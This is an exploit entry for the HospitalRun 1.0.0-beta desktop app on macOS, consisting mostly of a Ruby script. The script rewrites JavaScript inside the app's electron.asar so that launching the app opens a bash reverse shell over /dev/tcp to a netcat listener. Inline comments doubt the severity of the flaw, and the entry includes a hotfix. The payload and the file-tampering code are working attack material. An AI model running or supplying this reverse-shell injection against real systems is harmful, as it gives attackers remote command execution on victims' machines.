# Exploit Title: HospitalRun  1.0.0-beta - Local Root Exploit for macOS
# Written by Jean Pereira <info@cytres.com>

# Date: 2023/03/04
# Vendor Homepage: https://hospitalrun.io
# Software Link: https://github.com/HospitalRun/hospitalrun-frontend/releases/download/1.0.0-beta/HospitalRun.dmg
# Version: 1.0.0-beta
# Tested on: macOS Ventura 13.2.1 (22D68)

# Impact: Command Execution, Privilege Escalation

# Instructions:
# Run local TCP listener with (e.g. nc -l 2222)
# Run exploit
# Wait for HospitalRun to be executed
# Profit (privileged rights e.g. root are gained)

# Hotfix: Remove write permissions from electron.asar to patch this vulnerability

# Exploit:

#This just replaces some javascript code in the asar file with some other javascript that will spawn a reverse shell
#If you can write to the executable, of course you can change what it does.
buffer =  "const renderProcessPreferences = process.atomBinding('render_process_preferences').forAllWebContents()"

payload = "require(\"child_process\").execSync(\"/bin/bash -c \'exec bash -i >/dev/tcp/0.0.0.0/2222 0>&1\'\")"

#This only exists so that the text that gets replaced in the executable is the same length as before
#Otherwise the file format would break
nopsled = "/********/"

File.open("/Applications/HospitalRun.app/Contents/Resources/electron.asar", "rb+") do |file|
  electron = file.read
  electron.gsub!(buffer, payload + nopsled)
  file.pos = 0
  file.write(electron)
end